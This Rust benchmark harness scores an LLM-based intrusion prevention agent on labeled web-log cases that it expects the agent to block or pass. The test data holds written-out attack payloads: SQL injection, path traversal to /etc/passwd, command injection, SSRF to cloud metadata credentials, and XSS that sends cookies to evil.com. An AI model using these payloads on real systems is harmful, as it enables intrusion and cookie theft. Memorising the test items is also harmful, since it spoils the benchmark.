use std::fs::{self, OpenOptions, create_dir_all};
use std::io::Write;
use std::thread;
use std::time::{Duration, Instant};

use anyhow::Result;
use chrono::Local;
use sysinfo::System;
use rust_ai_agent::config::DEFAULT_MODEL_PATH;
use rust_ai_agent::model::Agent;
use rust_ai_agent::parser::{parse_threat_verdict, build_defense_action, DefenseAction};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum CaseGroup {
    Baseline,
    Holdout,
    /// Двусмысленные логи: ожидаем PASS (не блокировать без явной атаки), низкая уверенность — норма.
    Ambiguous,
}

struct ThreatCase {
    ip: &'static str,
    events: Vec<&'static str>,
    expected_action: &'static str,
    ua_rotation: bool,
    unique_ua_count: usize,
    group: CaseGroup,
}

fn main() -> Result<()> {
    let cases = threat_cases();
    let mp = model_path();

    let baseline_count = cases.iter().filter(|c| c.group == CaseGroup::Baseline).count();
    let holdout_count = cases.iter().filter(|c| c.group == CaseGroup::Holdout).count();
    let ambiguous_count = cases.iter().filter(|c| c.group == CaseGroup::Ambiguous).count();

    println!("--- Benchmark: Threat Analysis (IPS) ---");
    println!("Модель:   {mp}");
    println!("(путь: аргумент 1 или переменная IPS_MODEL_PATH)");
    println!("Инференс: см. env IPS_THREAT_* , IPS_QUIET=1 — без потока токенов в консоль");
    println!(
        "Кейсов:   {} (baseline={baseline_count}, holdout={holdout_count}, ambiguous={ambiguous_count})\n",
        cases.len()
    );

    let mut sys = System::new_all();
    sys.refresh_all();
    thread::sleep(Duration::from_millis(200));
    sys.refresh_all();

    let total_ram_mb = sys.total_memory() / (1024 * 1024);
    let cpu_count = sys.cpus().len();
    println!("Система: {} CPU, {} МБ RAM\n", cpu_count, total_ram_mb);

    sys.refresh_memory();
    let ram_before_load_mb = sys.used_memory() / (1024 * 1024);

    let mut agent = Agent::new("IPS-Benchmark");
    let load_started = Instant::now();
    agent.load(&mp)?;
    let load_ms = load_started.elapsed().as_millis();

    sys.refresh_memory();
    let ram_after_load_mb = sys.used_memory() / (1024 * 1024);
    let model_ram_mb = ram_after_load_mb.saturating_sub(ram_before_load_mb);

    println!("RAM модели: ~{model_ram_mb} МБ (до={ram_before_load_mb}, после={ram_after_load_mb})");

    create_dir_all("logs")?;

    let csv_path = "logs/benchmark_threat.csv";
    let needs_header = !fs::metadata(csv_path).map(|m| m.len() > 0).unwrap_or(false);

    let mut csv = OpenOptions::new()
        .create(true)
        .append(true)
        .open(csv_path)?;

    if needs_header {
        writeln!(csv, "model,load_ms,model_ram_mb,case_idx,group,ip,latency_ms,ram_mb,cpu_before,cpu_after,expected,predicted,confidence,action_taken,success")?;
    }

    let verdict_log_path = "logs/benchmark_verdicts.log";
    let mut verdict_log = OpenOptions::new()
        .create(true)
        .append(true)
        .open(verdict_log_path)?;
    println!("Лог вердиктов: {verdict_log_path}");

    let mut tp = 0usize; // predicted BLOCK, expected BLOCK (via defense action)
    let mut fp = 0usize; // predicted BLOCK, expected PASS
    let mut tn = 0usize; // predicted PASS, expected PASS
    let mut fn_ = 0usize; // predicted PASS, expected BLOCK
    let mut errors = 0usize;
    let mut latencies: Vec<u128> = Vec::with_capacity(cases.len());
    let mut ambiguous_confidences: Vec<f64> = Vec::new();

    for (index, case) in cases.iter().enumerate() {
        let events: Vec<String> = case.events.iter().map(|s| s.to_string()).collect();
        let group_str = match case.group {
            CaseGroup::Baseline => "baseline",
            CaseGroup::Holdout => "holdout",
            CaseGroup::Ambiguous => "ambiguous",
        };

        sys.refresh_all();
        thread::sleep(Duration::from_millis(200));
        sys.refresh_all();
        let ram_mb = sys.used_memory() / (1024 * 1024);
        let cpu_before: f32 = sys.cpus().iter().map(|c| c.cpu_usage()).sum::<f32>() / cpu_count as f32;

        let started = Instant::now();
        let raw = match agent.analyze_threat(case.ip, &events, case.ua_rotation, case.unique_ua_count) {
            Ok(raw) => raw,
            Err(error) => {
                let latency_ms = started.elapsed().as_millis();
                latencies.push(latency_ms);
                errors += 1;
                let ts = Local::now().format("%Y-%m-%d %H:%M:%S");
                writeln!(
                    verdict_log,
                    "[{ts}] case={} group={} ip={} expected={} latency_ms={} INFERENCE_ERROR: {error}",
                    index + 1,
                    group_str,
                    case.ip,
                    case.expected_action,
                    latency_ms
                )?;
                writeln!(verdict_log, "{}", "=".repeat(72))?;
                writeln!(verdict_log)?;
                writeln!(
                    csv,
                    "\"{mp}\",{load_ms},{model_ram_mb},{},{group_str},{},{latency_ms},{ram_mb},{cpu_before:.1},0.0,\"{}\",\"ERROR\",0.0,\"ERROR\",false",
                    index + 1, case.ip, case.expected_action
                )?;
                println!("[{:2}] [{group_str:>8}] IP={:<16} => ERROR: {error}", index + 1, case.ip);
                continue;
            }
        };
        let latency_ms = started.elapsed().as_millis();
        latencies.push(latency_ms);

        sys.refresh_all();
        thread::sleep(Duration::from_millis(200));
        sys.refresh_all();
        let cpu_after: f32 = sys.cpus().iter().map(|c| c.cpu_usage()).sum::<f32>() / cpu_count as f32;

        let parsed = parse_threat_verdict(&raw);
        let (predicted, confidence, action_taken) = match &parsed {
            Ok(verdict) => {
                let action_str = format!("{:?}", verdict.action).to_uppercase();
                let defense = build_defense_action(verdict, case.ip);
                let taken = match &defense {
                    DefenseAction::BlockIp(_) => "BLOCK",
                    DefenseAction::Pass => "PASS",
                };
                (action_str, verdict.confidence, taken.to_owned())
            }
            Err(_) => ("PARSE_ERROR".to_owned(), 0.0, "PASS".to_owned()),
        };

        let success = action_taken == case.expected_action;

        if case.group == CaseGroup::Ambiguous {
            if let Ok(v) = &parsed {
                ambiguous_confidences.push(v.confidence);
            }
        }

        let ts = Local::now().format("%Y-%m-%d %H:%M:%S");
        writeln!(
            verdict_log,
            "[{ts}] case={} group={} ip={} expected={} latency_ms={} ram_mb={} cpu_before={:.1} cpu_after={:.1} success={}",
            index + 1,
            group_str,
            case.ip,
            case.expected_action,
            latency_ms,
            ram_mb,
            cpu_before,
            cpu_after,
            success
        )?;
        writeln!(verdict_log, "--- model raw output ---")?;
        writeln!(verdict_log, "{}", raw.trim())?;
        match &parsed {
            Ok(v) => {
                writeln!(verdict_log, "--- parsed verdict ---")?;
                writeln!(
                    verdict_log,
                    "action={:?} confidence={:.4} reason={}",
                    v.action, v.confidence, v.reason
                )?;
                let defense = build_defense_action(v, case.ip);
                writeln!(verdict_log, "defense={defense:?}")?;
            }
            Err(e) => {
                writeln!(verdict_log, "--- parse error ---")?;
                writeln!(verdict_log, "{e:#}")?;
            }
        }
        writeln!(verdict_log, "{}", "=".repeat(72))?;
        writeln!(verdict_log)?;

        match (case.expected_action, action_taken.as_str()) {
            ("BLOCK", "BLOCK") => tp += 1,
            ("PASS", "BLOCK") => fp += 1,
            ("PASS", "PASS") => tn += 1,
            ("BLOCK", "PASS") => fn_ += 1,
            _ => {}
        }

        writeln!(
            csv,
            "\"{mp}\",{load_ms},{model_ram_mb},{},{group_str},{},{latency_ms},{ram_mb},{cpu_before:.1},{cpu_after:.1},\"{}\",\"{predicted}\",{confidence:.2},\"{action_taken}\",{success}",
            index + 1, case.ip, case.expected_action
        )?;

        println!(
            "[{:2}] [{group_str:>8}] IP={:<16} => model={predicted} conf={confidence:.2} => action={action_taken}, expected={}, {latency_ms}ms {}",
            index + 1, case.ip, case.expected_action,
            if success { "OK" } else { "FAIL" }
        );
    }

    latencies.sort_unstable();
    let total: u128 = latencies.iter().sum();
    let n = latencies.len();
    let avg_latency = if n == 0 { 0.0 } else { total as f64 / n as f64 };
    let min_latency = latencies.first().copied().unwrap_or(0);
    let max_latency = latencies.last().copied().unwrap_or(0);
    let p95_latency = if n == 0 { 0 } else { latencies[(n as f64 * 0.95).ceil() as usize - 1] };

    let precision = if tp + fp > 0 { tp as f64 / (tp + fp) as f64 } else { 0.0 };
    let recall = if tp + fn_ > 0 { tp as f64 / (tp + fn_) as f64 } else { 0.0 };
    let f1 = if precision + recall > 0.0 { 2.0 * precision * recall / (precision + recall) } else { 0.0 };
    let accuracy = if n > 0 { (tp + tn) as f64 / (n - errors) as f64 } else { 0.0 };

    println!("\n=== Итог (defense action = build_defense_action с порогом confidence >= 0.7) ===");
    println!("accuracy:       {:.2}% ({}/{} кейсов)", accuracy * 100.0, tp + tn, n - errors);
    println!("precision:      {:.2}%", precision * 100.0);
    println!("recall:         {:.2}%", recall * 100.0);
    println!("f1:             {:.4}", f1);
    println!();
    println!("confusion matrix:");
    println!("  TP={tp}  FP={fp}");
    println!("  FN={fn_}  TN={tn}");
    println!("  errors={errors}");
    println!();
    println!("latency (ms):   avg={avg_latency:.1}  min={min_latency}  max={max_latency}  p95={p95_latency}");
    println!("load_ms:        {load_ms}");
    println!("model_ram_mb:   ~{model_ram_mb}");

    if !ambiguous_confidences.is_empty() {
        let n = ambiguous_confidences.len();
        let sum: f64 = ambiguous_confidences.iter().sum();
        let avg = sum / n as f64;
        let min_c = ambiguous_confidences
            .iter()
            .cloned()
            .fold(f64::INFINITY, f64::min);
        let max_c = ambiguous_confidences
            .iter()
            .cloned()
            .fold(f64::NEG_INFINITY, f64::max);
        let below_065 = ambiguous_confidences.iter().filter(|&&c| c < 0.65).count();
        println!();
        println!("=== Группа ambiguous (confidence, успешный разбор) ===");
        println!(
            "n={n}  avg={avg:.3}  min={min_c:.2}  max={max_c:.2}  conf<0.65: {below_065}/{n}"
        );
    }

    Ok(())
}

/// Путь к GGUF: первый аргумент `cargo run --bin benchmark -- <path>`, иначе `IPS_MODEL_PATH`, иначе значение по умолчанию.
fn model_path() -> String {
    let args: Vec<String> = std::env::args().collect();
    if args.len() >= 2 && !args[1].starts_with('-') {
        return args[1].clone();
    }
    std::env::var("IPS_MODEL_PATH").unwrap_or_else(|_| DEFAULT_MODEL_PATH.to_owned())
}

fn threat_cases() -> Vec<ThreatCase> {
    vec![
        // ===== BASELINE (совпадают с few-shot примерами в промпте) =====
        ThreatCase {
            ip: "192.168.1.50",
            events: vec![
                "/index.html 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "/about 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "/style.css 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "/contact 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                "/favicon.ico 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Baseline,
        },
        ThreatCase {
            ip: "10.0.0.55",
            events: vec![
                "/page?id=1' UNION SELECT username,password FROM users-- 403 | UA: sqlmap/1.8.1#stable",
                "/search?q=1 OR 1=1 500 | UA: sqlmap/1.8.1#stable",
                "/login?user=admin'-- 403 | UA: sqlmap/1.8.1#stable",
                "/api?token=1; DROP TABLE sessions 500 | UA: sqlmap/1.8.1#stable",
                "/page?id=1' AND 1=1-- 403 | UA: sqlmap/1.8.1#stable",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Baseline,
        },
        ThreatCase {
            ip: "172.16.0.10",
            events: vec![
                "/page?file=../../../../etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
                "/download?path=..%2F..%2Fetc%2Fshadow 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
                "/include?page=....//....//etc/passwd 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
                "/view?doc=../../../windows/system32/config/sam 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
                "/read?file=/proc/self/environ 403 | UA: Mozilla/5.0 (compatible; Nikto/2.1)",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Baseline,
        },
        ThreatCase {
            ip: "203.0.113.42",
            events: vec![
                "POST /login 401 | UA: python-requests/2.31.0",
                "POST /login 401 | UA: python-requests/2.31.0",
                "POST /login 401 | UA: python-requests/2.31.0",
                "POST /login 401 | UA: python-requests/2.31.0",
                "POST /login 401 | UA: python-requests/2.31.0",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Baseline,
        },
        ThreatCase {
            ip: "198.51.100.8",
            events: vec![
                "/admin 404 | UA: sqlmap/1.8.1#stable",
                "/phpmyadmin 404 | UA: sqlmap/1.8.1#stable",
                "/wp-admin 404 | UA: sqlmap/1.8.1#stable",
                "/manager 404 | UA: sqlmap/1.8.1#stable",
                "/.env 404 | UA: sqlmap/1.8.1#stable",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Baseline,
        },
        ThreatCase {
            ip: "45.33.32.156",
            events: vec![
                "/login 401 | UA: Mozilla/5.0 Chrome/120.0",
                "/login 401 | UA: python-requests/2.31.0",
                "/login 401 | UA: curl/8.4.0",
                "/admin 403 | UA: Go-http-client/1.1",
                "/wp-login.php 404 | UA: Mozilla/4.0 (compatible; MSIE 6.0)",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 5,
            group: CaseGroup::Baseline,
        },

        // ===== HOLDOUT (новые кейсы, не встречающиеся в промпте) =====

        // XSS-атака через параметры
        ThreatCase {
            ip: "185.220.101.34",
            events: vec![
                "/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
                "/comment?body=<img src=x onerror=alert(1)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
                "/profile?name=<svg/onload=fetch('http://evil.com/'+document.cookie)> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
                "/guestbook?msg=<iframe src=javascript:alert('XSS')> 403 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Holdout,
        },

        // Command injection
        ThreatCase {
            ip: "91.240.118.200",
            events: vec![
                "/ping?host=127.0.0.1;cat /etc/passwd 500 | UA: curl/7.88.1",
                "/dns?domain=example.com|whoami 500 | UA: curl/7.88.1",
                "/exec?cmd=ls%20-la%20/tmp 403 | UA: curl/7.88.1",
                "/shell?input=$(id) 403 | UA: curl/7.88.1",
                "/api/run?payload=`uname -a` 500 | UA: curl/7.88.1",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Holdout,
        },

        // Нормальный REST API трафик
        ThreatCase {
            ip: "10.20.30.40",
            events: vec![
                "GET /api/v1/products 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "GET /api/v1/products/42 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "POST /api/v1/cart 201 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "GET /api/v1/cart 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "DELETE /api/v1/cart/item/7 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Holdout,
        },

        // Легитимный краулер (Googlebot)
        ThreatCase {
            ip: "66.249.66.1",
            events: vec![
                "GET /robots.txt 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "GET /sitemap.xml 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "GET /products 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "GET /about 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                "GET /blog/post-1 200 | UA: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Holdout,
        },

        // Directory enumeration (gobuster)
        ThreatCase {
            ip: "178.62.45.99",
            events: vec![
                "/backup 404 | UA: gobuster/3.6",
                "/config 404 | UA: gobuster/3.6",
                "/database 404 | UA: gobuster/3.6",
                "/secret 404 | UA: gobuster/3.6",
                "/internal 404 | UA: gobuster/3.6",
                "/debug 404 | UA: gobuster/3.6",
                "/test 404 | UA: gobuster/3.6",
            ],
            expected_action: "BLOCK",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Holdout,
        },

        // Bruteforce с ротацией UA — 7 попыток, все 401, 5 разных UA
        ThreatCase {
            ip: "23.94.12.77",
            events: vec![
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1",
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Linux; Android 14) Chrome/120.0",
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Windows NT 10.0; rv:121.0) Gecko/20100101 Firefox/121.0",
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15",
                "POST /api/auth/login 401 | UA: Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0",
                "POST /api/auth/login 401 | UA: python-requests/2.31.0",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 7,
            group: CaseGroup::Holdout,
        },

        // SSRF-попытки к внутренним адресам
        ThreatCase {
            ip: "104.248.33.91",
            events: vec![
                "/proxy?url=http://169.254.169.254/latest/meta-data/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
                "/fetch?target=http://localhost:6379/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
                "/redirect?to=http://127.0.0.1:8080/admin 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
                "/load?src=http://0.0.0.0:22/ 403 | UA: Mozilla/5.0 (X11; Ubuntu; Linux x86_64) Chrome/119.0",
                "/api/fetch?endpoint=http://169.254.169.254/latest/api/token 403 | UA: curl/8.4.0",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 2,
            group: CaseGroup::Holdout,
        },

        // Нормальный трафик с единичной 404
        ThreatCase {
            ip: "192.168.5.100",
            events: vec![
                "GET / 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /products 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /products/999 404 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /products/42 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "POST /products/42/review 201 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Holdout,
        },
        // Хитрая mixed-атака: normal-looking traffic + SSRF/LFI + UA rotation
        ThreatCase {
            ip: "103.77.192.44",
            events: vec![
                "GET /api/v1/profile?id=842 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
                "GET /fetch?url=http://127.0.0.1:2375/version 403 | UA: curl/8.5.0",
                "GET /image?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/ 403 | UA: python-requests/2.31.0",
                "GET /export?file=..%2F..%2F..%2Fetc%2Fpasswd 403 | UA: Go-http-client/1.1",
                "GET /api/v1/profile?id=843 200 | UA: Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15",
                "GET /proxy?target=http://localhost:6379/INFO 403 | UA: Wget/1.21.4",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 5,
            group: CaseGroup::Holdout,
        },
        // Mixed attack: SQLi + traversal + UA rotation (English paths)
        ThreatCase {
            ip: "185.141.88.17",
            events: vec![
                "GET /catalog?page=1 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
                "GET /search?q=' UNION SELECT user,password FROM users-- 500 | UA: python-requests/2.31.0",
                "POST /login 401 | UA: curl/8.5.0",
                "GET /download?file=..%2F..%2Fetc%2Fpasswd 403 | UA: sqlmap/1.8.2#stable",
                "GET /admin 403 | UA: Go-http-client/1.1",
            ],
            expected_action: "BLOCK",
            ua_rotation: true,
            unique_ua_count: 4,
            group: CaseGroup::Holdout,
        },
        // Legitimate user traffic (browsing + cart + checkout)
        ThreatCase {
            ip: "192.168.10.77",
            events: vec![
                "GET /home 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
                "GET /catalog/laptops 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
                "GET /product/lenovo-thinkpad 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
                "POST /cart 201 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
                "GET /checkout 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/123.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Holdout,
        },

        // ===== AMBIGUOUS (пограничные сигналы — эталон PASS; низкий confidence ожидаем для демонстрации неуверенности) =====

        // Подстрока SELECT в бенигном контексте (не SQLi).
        ThreatCase {
            ip: "10.11.12.13",
            events: vec![
                "GET /reports?status=SELECTED&year=2024 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /reports/export?columns=SELECTED,name,date 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /dashboard 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
                "GET /settings 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Ambiguous,
        },

        // Два 401 подряд на /login — похоже на ошибку пароля, не на массовый брут.
        ThreatCase {
            ip: "172.20.30.40",
            events: vec![
                "POST /login 401 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "POST /login 401 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "GET / 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
                "GET /help 200 | UA: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) Safari/605.1.15",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Ambiguous,
        },

        // Смешанное окно: в основном Chrome, один запрос с curl — без явной атаки в пути.
        ThreatCase {
            ip: "198.18.0.50",
            events: vec![
                "GET /news 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
                "GET /article/42 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
                "HEAD /article/42 200 | UA: curl/8.5.0",
                "GET /contact 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
                "GET /about 200 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Ambiguous,
        },

        // «Траверсал» в каноническом пути документации (часто легитимно).
        ThreatCase {
            ip: "10.99.1.2",
            events: vec![
                "GET /docs/../docs/install 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
                "GET /static/app.js 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
                "GET /api/health 200 | UA: Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
            ],
            expected_action: "PASS",
            ua_rotation: false,
            unique_ua_count: 1,
            group: CaseGroup::Ambiguous,
        },
    ]
}
